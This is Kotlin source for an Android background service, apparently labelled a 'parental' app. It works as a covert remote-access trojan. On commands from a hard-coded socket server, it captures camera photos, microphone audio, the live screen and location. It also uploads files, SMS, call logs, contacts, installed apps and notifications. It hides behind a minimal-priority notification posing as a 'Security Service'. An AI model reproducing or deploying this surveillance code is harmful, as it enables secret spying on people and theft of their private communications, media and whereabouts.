package com.example.systemservice

import android.Manifest
import android.R
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.provider.MediaStore
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.util.Size
import android.view.WindowManager
import android.graphics.BitmapFactory
import android.media.ThumbnailUtils
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.google.android.gms.location.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.DecimalFormat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class MonitorService : LifecycleService() {

    private lateinit var mSocket: Socket
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    
    private var imageCapture: ImageCapture? = null
    private lateinit var cameraExecutor: ExecutorService
    
    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var projectionData: Intent? = null
    private var projectionResultCode: Int = 0
    private var isMirroring = false

    private val SERVER_URL = "http://192.168.1.4:3000"

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        cameraExecutor = Executors.newSingleThreadExecutor()
        
        val filter = IntentFilter("com.example.systemservice.NOTIFICATION_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(notificationReceiver, filter, RECEIVER_EXPORTED)
        } else {
            registerReceiver(notificationReceiver, filter)
        }
        
        // Start with a safe notification first to avoid immediate crash
        updateForegroundService()
        initializeSocket()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        if (intent != null && intent.hasExtra("resultCode")) {
            projectionResultCode = intent.getIntExtra("resultCode", 0)
            projectionData = intent.getParcelableExtra("data")
            Log.d("ParentalApp", "Screen Projection Token Received")
            // Update service with mediaProjection type now that we have the token
            updateForegroundService()
        }
        return START_STICKY
    }

    private fun updateForegroundService() {
        val channelId = "system_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Protection", NotificationManager.IMPORTANCE_MIN)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Security Service")
            .setContentText("Protecting your device in real-time...")
            .setSmallIcon(R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var type = 0
            
            // Only add types if permission is actually granted to prevent SecurityException crash
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (projectionData != null) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }

            try {
                if (type != 0) {
                    startForeground(1, notification, type)
                } else {
                    startForeground(1, notification)
                }
            } catch (e: Exception) {
                Log.e("ParentalApp", "FGS Start Error: ${e.message}")
                startForeground(1, notification)
            }
        } else {
            startForeground(1, notification)
        }
    }

    private val notificationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val jsonStr = intent.getStringExtra("data")
            if (jsonStr != null && this@MonitorService::mSocket.isInitialized) {
                mSocket.emit("child_notification", JSONObject(jsonStr))
            }
        }
    }

    private fun initializeSocket() {
        try {
            val options = IO.Options()
            options.reconnection = true
            options.reconnectionDelay = 2000
            options.timeout = 15000

            mSocket = IO.socket(SERVER_URL, options)
            mSocket.connect()

            mSocket.on(Socket.EVENT_CONNECT) {
                Log.d("ParentalApp", "SERVER CONNECTED")
                val data = JSONObject().put("device_id", "test_phone_01")
                mSocket.emit("register_child", data)
            }

            mSocket.on("remote_command") { args ->
                if (args.isNotEmpty()) {
                    try {
                        val data = args[0] as JSONObject
                        val action = data.getString("action")
                        
                        when(action) {
                            "get_location" -> sendCurrentLocation()
                            "take_photo" -> takePhoto(data.optString("camera", "back"))
                            "start_record" -> startRecording()
                            "stop_record" -> stopRecording()
                            "list_files" -> listFiles(data.optString("path", Environment.getExternalStorageDirectory().absolutePath))
                            "get_file" -> getFile(data.getString("file_path"))
                            "start_mirror" -> startScreenMirror()
                            "stop_mirror" -> stopScreenMirror()
                            "get_sms" -> readSMS()
                            "get_calls" -> readCallLogs()
                            "get_contacts" -> readContacts()
                            "get_apps" -> getInstalledApps()
                        }
                    } catch (e: Exception) {}
                }
            }
        } catch (e: Exception) {}
    }

    private fun startScreenMirror() {
        if (projectionData == null || isMirroring) return
        try {
            isMirroring = true
            val metrics = DisplayMetrics()
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(metrics)
            
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(projectionResultCode, projectionData!!)
            
            val width = metrics.widthPixels / 2
            val height = metrics.heightPixels / 2
            
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            virtualDisplay = mediaProjection?.createVirtualDisplay("Mirror", width, height, metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader?.surface, null, null)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                if (!isMirroring) return@setOnImageAvailableListener
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buffer = image.planes[0].buffer
                    val pixelStride = image.planes[0].pixelStride
                    val rowStride = image.planes[0].rowStride
                    val bitmap = Bitmap.createBitmap(width + (rowStride - pixelStride * width) / pixelStride, height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(buffer)
                    val stream = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 35, stream)
                    mSocket.emit("screen_frame", JSONObject().put("image", Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)))
                } catch (e: Exception) {} finally { image.close() }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) { stopScreenMirror() }
    }

    private fun stopScreenMirror() {
        isMirroring = false
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
    }

    private fun takePhoto(type: String) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider: ProcessCameraProvider = cameraProviderFuture.get()
            imageCapture = ImageCapture.Builder().build()
            val selector = if (type == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
            try {
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, selector, imageCapture)
                val photoFile = File(externalCacheDir, "temp.jpg")
                imageCapture?.takePicture(ImageCapture.OutputFileOptions.Builder(photoFile).build(), ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(res: ImageCapture.OutputFileResults) {
                            val base64 = Base64.encodeToString(photoFile.readBytes(), Base64.DEFAULT)
                            mSocket.emit("child_photo_taken", JSONObject().put("image", base64))
                            cameraProvider.unbindAll()
                        }
                        override fun onError(exc: ImageCaptureException) { cameraProvider.unbindAll() }
                    })
            } catch (e: Exception) { cameraProvider.unbindAll() }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun startRecording() {
        try {
            audioFile = File(externalCacheDir, "temp.mp3")
            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()).apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(audioFile?.absolutePath)
                prepare()
                start()
            }
        } catch (e: Exception) {}
    }

    private fun stopRecording() {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null
            audioFile?.let { 
                if (it.exists()) {
                    val base64 = Base64.encodeToString(it.readBytes(), Base64.DEFAULT)
                    mSocket.emit("child_audio_recorded", JSONObject().put("audio", base64))
                }
            }
        } catch (e: Exception) {}
    }

    private fun sendCurrentLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1000).build()
            fusedLocationClient.requestLocationUpdates(req, object : LocationCallback() {
                override fun onLocationResult(res: LocationResult) {
                    res.lastLocation?.let { mSocket.emit("child_location_update", JSONObject().put("lat", it.latitude).put("lng", it.longitude)) }
                    fusedLocationClient.removeLocationUpdates(this)
                }
            }, Looper.getMainLooper())
        }
    }

    private fun listFiles(path: String) {
        val root = File(path)
        val files = root.listFiles()
        val list = JSONArray()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())

        files?.forEach {
            try {
                val item = JSONObject()
                item.put("name", it.name)
                item.put("is_directory", it.isDirectory)
                item.put("size", if (it.isDirectory) 0 else it.length())
                item.put("formatted_size", if (it.isDirectory) "" else formatSize(it.length()))
                item.put("path", it.absolutePath)
                item.put("last_modified", dateFormat.format(Date(it.lastModified())))
                
                if (!it.isDirectory && it.length() > 0) {
                    if (isImage(it.name) || isVideo(it.name)) {
                        item.put("thumbnail", getThumbnail(it))
                    }
                }
                list.put(item)
            } catch (e: Exception) {}
        }
        mSocket.emit("file_list", JSONObject().put("path", path).put("files", list))
    }

    private fun formatSize(size: Long): String {
        if (size <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        val digitGroups = (Math.log10(size.toDouble()) / Math.log10(1024.0)).toInt()
        return DecimalFormat("#,##0.#").format(size / Math.pow(1024.0, digitGroups.toDouble())) + " " + units[digitGroups]
    }

    private fun isImage(name: String) = name.lowercase().let { it.endsWith(".jpg") || it.endsWith(".jpeg") || it.endsWith(".png") || it.endsWith(".webp") }
    private fun isVideo(name: String) = name.lowercase().let { it.endsWith(".mp4") || it.endsWith(".mkv") || it.endsWith(".3gp") }

    private fun getThumbnail(file: File): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (isImage(file.name)) {
                    ThumbnailUtils.createImageThumbnail(file, Size(128, 128), null)
                } else {
                    ThumbnailUtils.createVideoThumbnail(file, Size(128, 128), null)
                }
            } else {
                if (isImage(file.name)) {
                    val options = BitmapFactory.Options().apply {
                        inJustDecodeBounds = true
                        BitmapFactory.decodeFile(file.absolutePath, this)
                        inSampleSize = calculateInSampleSize(this, 128, 128)
                        inJustDecodeBounds = false
                    }
                    val b = BitmapFactory.decodeFile(file.absolutePath, options)
                    ThumbnailUtils.extractThumbnail(b, 128, 128)
                } else {
                    ThumbnailUtils.createVideoThumbnail(file.absolutePath, MediaStore.Video.Thumbnails.MINI_KIND)
                }
            }

            val stream = ByteArrayOutputStream()
            bitmap?.compress(Bitmap.CompressFormat.JPEG, 60, stream)
            Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
        val (height: Int, width: Int) = options.run { outHeight to outWidth }
        var inSampleSize = 1
        if (height > reqHeight || width > reqWidth) {
            val halfHeight: Int = height / 2
            val halfWidth: Int = width / 2
            while (halfHeight / inSampleSize >= reqHeight && halfWidth / inSampleSize >= reqWidth) {
                inSampleSize *= 2
            }
        }
        return inSampleSize
    }

    private fun getFile(path: String) {
        val file = File(path)
        if (file.exists() && file.isFile) {
            mSocket.emit("file_data", JSONObject().put("file_name", file.name).put("file_data", Base64.encodeToString(file.readBytes(), Base64.DEFAULT)))
        }
    }

    private fun readSMS() {
        val list = JSONArray()
        val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 50")
        cursor?.use {
            while (it.moveToNext()) {
                list.put(JSONObject().apply {
                    put("address", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)))
                    put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)))
                    put("date", it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                })
            }
        }
        mSocket.emit("child_sms_list", JSONObject().put("sms", list))
    }

    private fun readCallLogs() {
        val list = JSONArray()
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 50")
        cursor?.use {
            while (it.moveToNext()) {
                list.put(JSONObject().apply {
                    put("number", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
                    put("type", it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                    put("duration", it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                    put("date", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                })
            }
        }
        mSocket.emit("child_call_logs", JSONObject().put("calls", list))
    }

    private fun readContacts() {
        val list = JSONArray()
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, "display_name ASC")
        cursor?.use {
            while (it.moveToNext()) {
                list.put(JSONObject().apply {
                    put("name", it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                    put("number", it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                })
            }
        }
        mSocket.emit("child_contacts", JSONObject().put("contacts", list))
    }

    private fun getInstalledApps() {
        val list = JSONArray()
        val packages = packageManager.getInstalledPackages(0)
        for (pkg in packages) {
            list.put(JSONObject().apply {
                put("name", pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: pkg.packageName)
                put("package", pkg.packageName)
            })
        }
        mSocket.emit("child_apps", JSONObject().put("apps", list))
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(notificationReceiver) } catch (e: Exception) {}
        stopScreenMirror()
        cameraExecutor.shutdown()
        if (this::mSocket.isInitialized) mSocket.disconnect()
    }

    override fun onBind(intent: Intent): IBinder? = super.onBind(intent)
}
